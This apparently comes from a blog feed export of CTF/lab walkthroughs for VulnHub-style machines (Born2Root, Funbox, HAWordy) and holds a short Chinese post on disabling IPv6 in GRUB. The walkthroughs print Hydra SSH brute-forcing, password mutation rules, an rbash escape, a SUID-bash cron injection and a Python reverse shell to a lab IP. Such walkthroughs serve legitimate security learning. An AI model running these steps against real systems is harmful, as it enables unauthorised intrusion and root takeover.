<h3 id="SSH-Login-Brute-Force"><a href="#SSH-Login-Brute-Force" class="headerlink" title="SSH Login Brute-Force"></a><strong>SSH Login Brute-Force</strong></h3><p>Let’s check <strong>/etc/passwd</strong> to get a list of available users on the system:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jimmy@debian:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/falseDebian-exim:x:104:109::/var/spool/exim4:/bin/falsemessagebus:x:105:110::/var/run/dbus:/bin/falsestatd:x:106:65534::/var/lib/nfs:/bin/falsesshd:x:107:65534::/var/run/sshd:/usr/sbin/nologinhadi:x:1000:1000:hadi,,,:/home/hadi:/bin/bashmartin:x:1001:1001:,,,:/home/martin:/bin/bashjimmy:x:1002:1002:,,,:/home/jimmy:/bin/bash</span><br></pre></td></tr></table></figure>

<p>The user <code>Hadi</code> stands out as another user also mentioned on the company website.</p>
<p>We will use <code>John</code> to create a mutated wordlist containing basic usernames that include the word <code>hadi</code>. First, edit John’s configuration file <strong>/etc/john/john.conf</strong> to include more rules by adding the following to the <code>[List.Rules:Wordlist]</code> section:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># crack -&gt; cracked, crack -&gt; cracking-[:c] &lt;* &gt;2 !?A \p1[lc] M [PI] Q# Try the second half of split passwords-s x**-s-c x** M l Q# Add one number to the end of each password$[0-9]# Add two numbers to the end of each password$[0-9]$[0-9]# Add three numbers to the end of each password$[0-9]$[0-9]$[0-9]# Add four numbers to the end of each password#$[0-9]$[0-9]$[0-9]$[0-9]</span><br></pre></td></tr></table></figure>

<p>Next, we can mutate the wordlist:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ john --wordlist=passwords.txt --rules --stdout &gt; passwords-mutated.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">1161p 0:00:00:00 100.00% (2020-03-06 09:37) 19350p/s hadi999</span><br><span class="line">root@kali:~/Documents/VulnHub/born2root# wc -l passwords-mutated.txt</span><br><span class="line">1161 passwords-mutated.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Now we can try brute-forcing the password for the user <code>hadi</code> using <code>Hydra</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ hydra -t 4 -l hadi -P passwords-mutated.txt 192.168.120.52 ssh</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-06 09:39:44</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 1161 login tries (l:1/p:1161), ~291 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.120.52:22/</span><br><span class="line">[STATUS] 24.00 tries/min, 24 tries in 00:01h, 1137 to do in 00:48h, 4 active</span><br><span class="line">[STATUS] 26.33 tries/min, 79 tries in 00:03h, 1082 to do in 00:42h, 4 active</span><br><span class="line">[STATUS] 23.43 tries/min, 164 tries in 00:07h, 997 to do in 00:43h, 4 active</span><br><span class="line">[STATUS] 23.67 tries/min, 284 tries in 00:12h, 877 to do in 00:38h, 4 active</span><br><span class="line">[22][ssh] host: 192.168.120.52   login: hadi   password: hadi123</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-06 09:52:26</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We find that the password is <code>hadi123</code>, and now we simply switch from our current user to <code>hadi</code> with the recovered password:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jimmy@debian:~$ su hadi</span><br><span class="line">...</span><br><span class="line">hadi@debian:/home/jimmy$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(hadi) gid=1000(hadi) groups=1000(hadi),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Escalation-to-Root"><a href="#Escalation-to-Root" class="headerlink" title="Escalation to Root"></a><strong>Escalation to Root</strong></h3><p>The password for <code>root</code> was re-used and is the same as <code>hadi</code>‘s: <code>hadi123</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hadi@debian:~$ su -</span><br><span class="line">Password:</span><br><span class="line">root@debian:~# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Reverse Shell</tag>
        <tag>Gobuster</tag>
        <tag>Brute-Force</tag>
        <tag>John</tag>
      </tags>
  </entry>
  <entry>
    <title>Debian设置GRUB启动参数禁用IPV6</title>
    <url>/undefined/Debian%E8%AE%BE%E7%BD%AEGRUB%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0%E7%A6%81%E7%94%A8IPV6/</url>
    <content><![CDATA[<h1 id="Debian设置GRUB启动参数禁用IPV6"><a href="#Debian设置GRUB启动参数禁用IPV6" class="headerlink" title="Debian设置GRUB启动参数禁用IPV6"></a>Debian设置GRUB启动参数禁用IPV6</h1><p>在国外服务商租用VPS后，发现无法使用ping命令和goolge进行交互，并出现十六进制的MAC地址</p>
<p>原因是Linux系统IPV6优先级最高，默认使用IPV6地址进行ping命令。</p>
<p>我们可以在系统中设置GRUB启动参数禁用IPV6</p>
<p>编辑 <code>/etc/default/grub</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/default/grub</span><br></pre></td></tr></table></figure>

<p>找到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet&quot;</span><br></pre></td></tr></table></figure>

<p>修改为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;ipv6.disable=1 quiet&quot;</span><br></pre></td></tr></table></figure>

<p>随后执行命令更新GRUB启动参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-grub</span><br></pre></td></tr></table></figure>

<p>最后重启系统即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Debian</tag>
        <tag>GRUB</tag>
        <tag>IPV6</tag>
      </tags>
  </entry>
  <entry>
    <title>Funbox1</title>
    <url>/undefined/Funbox1/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Funbox"><a href="#Exploitation-Guide-for-Funbox" class="headerlink" title="Exploitation Guide for Funbox"></a><strong>Exploitation Guide for Funbox</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# sudo nmap 192.168.120.189</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 22:10 EDT</span><br><span class="line">Nmap scan report for 192.168.120.189</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a><strong>FTP</strong></h3><p>We first check if we can access the FTP service without credentials.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# ftp 192.168.120.189</span><br><span class="line">Connected to 192.168.120.189.</span><br><span class="line">220 ProFTPD Server (Debian) [::ffff:192.168.120.189]</span><br><span class="line">Name (192.168.120.189:kali): anonymous</span><br><span class="line">331 Password required for anonymous</span><br><span class="line">Password:</span><br><span class="line">530 Login incorrect.</span><br><span class="line">Login failed.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>However, we are unlucky and so we will leave this one for now.</p>
<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a><strong>Web Enumeration</strong></h3><p>Browsing to the website on port 80 we find it redirects to <a href="http://funbox.fritz.box/">http://funbox.fritz.box/</a>. We can add a hosts file entry to get things working correctly for us.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# sudo echo &quot;192.168.120.189 funbox.fritz.box&quot; &gt;&gt; /etc/hosts</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Now that we can access the website, we see that it is running WordPress. Our next step is to run <code>wpscan</code> to see if we can identify any vulnerabilities and any usernames.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://funbox.fritz.box/ --enumerate u</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.1</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://funbox.fritz.box/ [192.168.120.189]</span><br><span class="line">[+] Started: Thu Aug 20 22:26:14 2020</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] joe</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Thu Aug 20 22:26:24 2020</span><br><span class="line">[+] Requests Done: 26</span><br><span class="line">[+] Cached Requests: 36</span><br><span class="line">[+] Data Sent: 6.525 KB</span><br><span class="line">[+] Data Received: 257.882 KB</span><br><span class="line">[+] Memory used: 150.535 MB</span><br><span class="line">[+] Elapsed time: 00:00:09</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can see <code>wpscan</code> identified two users, <code>joe</code> and <code>admin</code>. With this knowledge we can continue by next looking at the SSH service.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="SSH-Brute-Force"><a href="#SSH-Brute-Force" class="headerlink" title="SSH Brute Force"></a><strong>SSH Brute Force</strong></h3><p>Since we now have a potential username, <code>joe</code>, we can attempt to brute force the password using <code>hydra</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# hydra -l joe -P /usr/share/wordlists/rockyou.txt ssh://192.168.120.189</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-20 22:33:11</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.120.189:22/</span><br><span class="line">[22][ssh] host: 192.168.120.189   login: joe   password: 12345</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 3 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 3 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 targets did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-20 22:33:20</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>This quickly identifies the password <code>12345</code> and we can use these credentials to login via SSH.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh joe@192.168.120.189</span><br><span class="line">...</span><br><span class="line">joe@funbox:~$ id</span><br><span class="line">uid=1001(joe) gid=1001(joe) groups=1001(joe)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Shell-Breakout"><a href="#Shell-Breakout" class="headerlink" title="Shell Breakout"></a><strong>Shell Breakout</strong></h3><p>If we try to change directory we find that we are in a restricted shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:~$ cd /</span><br><span class="line">-rbash: cd: restricted</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Before we can continue our enumeration we will need to escape this and obtain a full shell. First we will check our environment to see what we have access to.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:~$ env</span><br><span class="line">SHELL=/bin/rbash</span><br><span class="line">PWD=/home/joe</span><br><span class="line">LOGNAME=joe</span><br><span class="line">XDG_SESSION_TYPE=tty</span><br><span class="line">MOTD_SHOWN=pam</span><br><span class="line">HOME=/home/joe</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">...</span><br><span class="line">LESSOPEN=| /usr/bin/lesspipe %s</span><br><span class="line">USER=joe</span><br><span class="line">SHLVL=1</span><br><span class="line">XDG_SESSION_ID=28</span><br><span class="line">XDG_RUNTIME_DIR=/run/user/1001</span><br><span class="line">SSH_CLIENT=192.168.118.6 50000 22</span><br><span class="line">XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line">DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus</span><br><span class="line">SSH_TTY=/dev/pts/0</span><br><span class="line">_=/usr/bin/env</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Looking at the <code>PATH</code> variable it appears to be unchanged and as such we can just run <code>bash</code> normally to escape.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:~$ bashjoe@funbox:~$ cd /joe@funbox:/$</span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Insecure-File-Permissions"><a href="#Insecure-File-Permissions" class="headerlink" title="Insecure File Permissions"></a><strong>Insecure File Permissions</strong></h3><p>If we return to <code>joe&#39;s</code> home directory we can find a file called <code>mbox</code> containing some interesting information.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:/$ cd ~joe@funbox:~$ cat mboxFrom root@funbox  Fri Jun 19 13:12:38 2020Return-Path: &lt;root@funbox&gt;X-Original-To: joe@funboxDelivered-To: joe@funboxReceived: by funbox.fritz.box (Postfix, from userid 0)        id 2D257446B0; Fri, 19 Jun 2020 13:12:38 +0000 (UTC)Subject: BackupsTo: &lt;joe@funbox&gt;X-Mailer: mail (GNU Mailutils 3.7)Message-Id: &lt;20200619131238.2D257446B0@funbox.fritz.box&gt;Date: Fri, 19 Jun 2020 13:12:38 +0000 (UTC)From: root &lt;root@funbox&gt;Hi Joe, please tell funny the backupscript is done.From root@funbox  Fri Jun 19 13:15:21 2020Return-Path: &lt;root@funbox&gt;X-Original-To: joe@funboxDelivered-To: joe@funboxReceived: by funbox.fritz.box (Postfix, from userid 0)        id 8E2D4446B0; Fri, 19 Jun 2020 13:15:21 +0000 (UTC)Subject: BackupsTo: &lt;joe@funbox&gt;X-Mailer: mail (GNU Mailutils 3.7)Message-Id: &lt;20200619131521.8E2D4446B0@funbox.fritz.box&gt;Date: Fri, 19 Jun 2020 13:15:21 +0000 (UTC)From: root &lt;root@funbox&gt;Joe, WTF!?!?!?!?!?! Change your password right now! 12345 is an recommendation to fire you.</span><br></pre></td></tr></table></figure>

<p>It appears that a user called <code>funny</code> is waiting on a backup script. If we change to <code>funny&#39;s</code> home directory we can find the script with some insecure file permissions.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:/home/funny$ ls -lahtotal 47Mdrwxr-xr-x 3 funny funny 4.0K Jul 18 10:02 .drwxr-xr-x 4 root  root  4.0K Jun 19 11:50 ..-rwxrwxrwx 1 funny funny   55 Jul 18 10:15 .backup.sh-rw------- 1 funny funny    0 Aug 14 13:03 .bash_history-rw-r--r-- 1 funny funny  220 Feb 25 12:03 .bash_logout-rw-r--r-- 1 funny funny 3.7K Feb 25 12:03 .bashrcdrwx------ 2 funny funny 4.0K Jun 19 10:43 .cache-rw-rw-r-- 1 funny funny  47M Aug 21 06:58 html.tar-rw-r--r-- 1 funny funny  807 Feb 25 12:03 .profile-rw-rw-r-- 1 funny funny  162 Jun 19 14:13 .reminder.sh-rw-rw-r-- 1 funny funny   74 Jun 19 12:25 .selected_editor-rw-r--r-- 1 funny funny    0 Jun 19 10:44 .sudo_as_admin_successful-rw------- 1 funny funny 7.7K Jul 18 10:02 .viminfojoe@funbox:/home/funny$ cat .backup.sh#!/bin/bashtar -cf /home/funny/html.tar /var/www/html</span><br></pre></td></tr></table></figure>

<p>Before we overwrite the file, let’s first check whether or not it is being executed and who by. To do this we will use <a href="https://github.com/DominicBreuker/pspy">pspy</a>. <code>pspy</code> is tool which allows you to snoop on processes without needing <code>root</code> permissions. We can download <code>pspy</code> to <code>/tmp</code> and run it for several minutes to see if anything interesting is revealed.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64...2020-08-21 07:05:12 (24.4 MB/s) - ‘pspy64’ saved [3078592/3078592]joe@funbox:/tmp$ chmod +x pspy64joe@funbox:/tmp$ ./pspy64pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855     ██▓███    ██████  ██▓███ ▓██   ██▓    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                   ░           ░ ░                               ░ ░Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)Draining file system events due to startup...done2020/08/21 07:05:32 CMD: UID=0    PID=978    | proftpd: (accepting connections)2020/08/21 07:05:32 CMD: UID=112  PID=951    | /usr/sbin/mysqld2020/08/21 07:05:32 CMD: UID=0    PID=943    | /usr/lib/policykit-1/polkitd --no-debug2020/08/21 07:05:32 CMD: UID=0    PID=924    | /bin/login -p --...2020/08/21 07:05:32 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity2020/08/21 07:06:01 CMD: UID=0    PID=13193  | /usr/sbin/CRON -f2020/08/21 07:06:01 CMD: UID=1000 PID=13194  | /bin/sh -c /home/funny/.backup.sh2020/08/21 07:06:01 CMD: UID=1000 PID=13195  | /bin/bash /home/funny/.backup.sh2020/08/21 07:06:01 CMD: UID=1000 PID=13196  | tar -cf /home/funny/html.tar /var/www/html2020/08/21 07:06:01 CMD: UID=1000 PID=13198  | /usr/sbin/postdrop -r2020/08/21 07:06:01 CMD: UID=1000 PID=13197  | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem funny...2020/08/21 07:10:01 CMD: UID=0    PID=13405  | /bin/sh -c /home/funny/.backup.sh2020/08/21 07:10:01 CMD: UID=1000 PID=13404  | tar -cf /home/funny/html.tar /var/www/html2020/08/21 07:10:01 CMD: UID=0    PID=13403  | /bin/sh -c /home/funny/.backup.sh2020/08/21 07:10:01 CMD: UID=1000 PID=13402  | /bin/bash /home/funny/.backup.sh2020/08/21 07:10:01 CMD: UID=1000 PID=13401  | /bin/sh -c /home/funny/.backup.sh2020/08/21 07:10:01 CMD: UID=0    PID=13400  | /usr/sbin/CRON -f2020/08/21 07:10:01 CMD: UID=0    PID=13399  | /usr/sbin/CRON -f2020/08/21 07:10:01 CMD: UID=0    PID=13406  | tar -cf /home/funny/html.tar /var/www/html2020/08/21 07:10:02 CMD: UID=0    PID=13407  | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root2020/08/21 07:10:02 CMD: UID=1000 PID=13410  | /usr/sbin/postdrop -r2020/08/21 07:10:02 CMD: UID=0    PID=13409  | /usr/sbin/postdrop -r2020/08/21 07:10:02 CMD: UID=1000 PID=13408  | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem funny2020/08/21 07:10:02 CMD: UID=0    PID=13411  | cleanup -z -t unix -u -c2020/08/21 07:10:02 CMD: UID=0    PID=13412  | trivial-rewrite -n rewrite -t unix -u -c2020/08/21 07:10:02 CMD: UID=0    PID=13413  | local -t unix2020/08/21 07:10:02 CMD: UID=0    PID=13414  | local -t unix</span><br></pre></td></tr></table></figure>

<p>Although we do initially see that <code>/home/funny/.backup.sh</code> is run as <code>funny</code>, we later see that it is also run as <code>root</code>. So to exploit this all we need to do is append a malicious command to <code>/home/funny/.backup.sh</code>. We can do this as follows.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:~$ echo &quot;cp -f /bin/bash /tmp/bash &amp;&amp; chmod u+s /tmp/bash&quot; &gt;&gt; /home/funny/.backup.shjoe@funbox:~$ cat /home/funny/.backup.sh#!/bin/bashtar -cf /home/funny/html.tar /var/www/htmlcp -f /bin/bash /tmp/bash &amp;&amp; chmod u+s /tmp/bash</span><br></pre></td></tr></table></figure>

<p>Now we wait five to ten minutes for our command to execute and then we should find a copy of <code>bash</code> in the <code>/tmp</code> directory with its SUID bit set. We can then execute this to obtain a root shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:~$ ls -lah /tmptotal 4.2Mdrwxrwxrwt 13 root root  4.0K Aug 21 07:18 .drwxr-xr-x 20 root root  4.0K Aug 14 12:40 ..-rwsr-xr-x  1 root funny 1.2M Aug 21 07:35 bashdrwxrwxrwt  2 root root  4.0K Aug 21 02:07 .font-unixdrwxrwxrwt  2 root root  4.0K Aug 21 02:07 .ICE-unix-rwxrwxr-x  1 joe  joe   3.0M Aug 22  2019 pspy64drwx------  3 root root  4.0K Aug 21 02:07 snap.lxddrwx------  3 root root  4.0K Aug 21 02:07 systemd-private-743ec18eec5840e98c3875859e1eab06-apache2.service-sFj0Vedrwx------  3 root root  4.0K Aug 21 02:07 systemd-private-743ec18eec5840e98c3875859e1eab06-systemd-logind.service-H0gLpjdrwx------  3 root root  4.0K Aug 21 02:10 systemd-private-743ec18eec5840e98c3875859e1eab06-systemd-resolved.service-xyb48idrwx------  3 root root  4.0K Aug 21 02:07 systemd-private-743ec18eec5840e98c3875859e1eab06-systemd-timesyncd.service-SpPXfhdrwxrwxrwt  2 root root  4.0K Aug 21 02:07 .Test-unixdrwx------  2 root root  4.0K Aug 21 02:07 vmware-root_656-2689274927drwxrwxrwt  2 root root  4.0K Aug 21 02:07 .X11-unixdrwxrwxrwt  2 root root  4.0K Aug 21 02:07 .XIM-unixjoe@funbox:~$ /tmp/bash -pbash-5.0# iduid=1001(joe) gid=1001(joe) euid=0(root) groups=1001(joe)</span><br></pre></td></tr></table></figure>

<p>Focus：</p>
<p>修改.backup.sh的内容为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bashtar -cf /home/funny/html.tar /var/www/htmlpython -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.49.73&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>

<p>等待2分钟获得了反弹的Shell进行退出</p>
<p>再次进行端口监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>

<p>等待5分钟即可获得ROOT权限的Shell</p>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Reverse Shell</tag>
        <tag>Brute-Force</tag>
        <tag>Script</tag>
      </tags>
  </entry>
  <entry>
    <title>HAWordy</title>
    <url>/undefined/HAWordy/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-HAWordy"><a href="#Exploitation-Guide-for-HAWordy" class="headerlink" title="Exploitation Guide for HAWordy"></a><strong>Exploitation Guide for HAWordy</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.120.51</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-02 09:51 EST</span><br><span class="line">Nmap scan report for 192.168.120.51</span><br><span class="line">Host is up (0.029s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a><strong>Dirb</strong></h3><p>We can use <code>dirb</code> to brute-force the website’s directories:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ dirb http://192.168.120.51/</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon Mar  2 10:01:40 2020</span><br><span class="line">URL_BASE: http://192.168.120.51/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.120.51/ ----</span><br><span class="line">+ http://192.168.120.51/index.html (CODE:200|SIZE:10918)</span><br><span class="line">+ http://192.168.120.51/info.php (CODE:200|SIZE:14)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.51/javascript/</span><br><span class="line">+ 